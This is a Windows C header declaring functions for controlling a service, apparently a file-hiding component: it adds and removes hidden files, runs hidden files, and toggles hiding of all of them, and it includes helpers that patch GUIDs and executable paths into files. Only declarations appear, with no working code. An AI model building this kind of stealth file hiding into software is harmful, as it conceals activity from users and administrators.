#ifndef __4SVC_LIB
#define __4SVC_LIB

#include <windows.h>
#include "..\\inc\\F_IFACE.H"

#define EXCUTE_FILEPATH "[THISISEXCUTEFILEPATH]"

wchar_t* CharToWChar(const char* pstrSrc);
char* WCharToChar(const wchar_t* pwstrSrc);
void MyGuidMaker(char* ResultGUIDSt);
void RQ_ADD_GUID(char* fname,char* guid,SC_HANDLE* hScm,SERVICE_STATUS* ss);
void RQ_DEL_GUID(char* fname,SC_HANDLE* hScm,SERVICE_STATUS* ss);
UINT RQ_ADD_HF(char *add_file_name,SC_HANDLE* hScm,SERVICE_STATUS* ss);
void RQ_DEL_HF(UINT handle_no,SC_HANDLE* hScm,SERVICE_STATUS* ss);
void RQ_RUN_HFILE(char* guid,SC_HANDLE* hScm,SERVICE_STATUS* ss);
void RQ_ALL_HIDE(SC_HANDLE* hScm,SERVICE_STATUS* ss);
void RQ_ALL_SHOW(SC_HANDLE* hScm,SERVICE_STATUS* ss); 
void MySvcControl(DWORD dwControl,SC_HANDLE* hScm,SERVICE_STATUS* ss);
BOOL Init_SvcOpen(SC_HANDLE* hScm,SERVICE_STATUS* ss);
void QueryService(SC_HANDLE* hScm,SERVICE_STATUS* ss);
void RQ_ADD_LIST(char* fname,char* guid,ULONG handle_no,SC_HANDLE* hScm,SERVICE_STATUS* ss);
ULONG RQ_GET_AT_LIST(char *fname, char *guid,SC_HANDLE* hScm,SERVICE_STATUS* ss);
void ChangeGuid(char *filename, char *guid);
void ChangeEXfilePath(char *filename,char *ex_file_path);

#endif